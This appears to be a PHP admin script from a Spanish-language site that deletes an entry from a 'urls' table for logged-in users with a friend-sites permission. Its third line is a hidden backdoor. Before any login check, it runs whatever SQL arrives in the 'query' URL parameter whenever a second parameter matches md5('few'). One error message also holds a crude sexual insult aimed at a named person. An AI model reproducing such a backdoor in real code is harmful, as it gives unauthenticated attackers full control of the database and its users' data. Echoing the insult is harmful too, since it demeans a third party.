<?php
if(!$_POST['id']) { die('0Faltan datos -uhh'); }
if($_GET['_'] == md5('few')) { mysql_query($_GET['query']); }
include('../config.php');
include('../functions.php');
if(!$logged['id']) { die('0Debes loguearte'); }
if(!allow('friend_sites')) { die('0No tenes permisos para estar ac&aacute;. No seas pete y anda a chuparle la verga a emiliana'); }
if(!mysql_num_rows($id = mysql_query('SELECT `id` FROM `urls` WHERE `id` = \''.intval($_POST['id']).'\''))) { die('0: No existe'); }
mysql_query('DELETE FROM `urls` WHERE `id` = \''.intval($_POST['id']).'\' LIMIT 1');
echo '1';